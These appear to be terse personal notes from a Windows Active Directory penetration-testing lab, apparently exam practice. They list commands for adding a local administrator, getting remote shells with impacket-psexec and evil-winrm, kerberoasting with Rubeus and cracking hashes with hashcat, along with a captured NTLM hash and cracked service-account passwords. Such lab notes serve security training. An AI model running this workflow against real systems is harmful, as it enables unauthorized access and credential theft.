net localgroup Administrators Eric.Wallows /add

net localgroup Administrators

![[Enum for LM image.png]]

impacket-psexec 'Eric.Wallows:EricLikesRunning800@192.168.109.147'

![[Enum for LM image 1.png]]

![[Enum for LM image 2.png]]

![[Enum for LM image 3.png]]

Administrator

3c4495bbd678fac8c9d218be4f2bbc7b

![[Enum for LM image 4.png]]

December31

evil-winrm -i 192.168.109.147 -u 'Administrator' -p 'December31'

![[Enum for LM image 5.png]]

![[Enum for LM image 6.png]]

![[Enum for LM image 7.png]]

.\Rubeus.exe kerberoast /outfile:hashes.kerberoas

![[Enum for LM image 8.png]]

![[Enum for LM image 9.png]]

sudo hashcat -m 13100 hashes.kerberoas /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule --force

![[Enum for LM image 10.png]]

![[Enum for LM image 11.png]]

web_svc

Diamond1

sql_svc

Dolphin1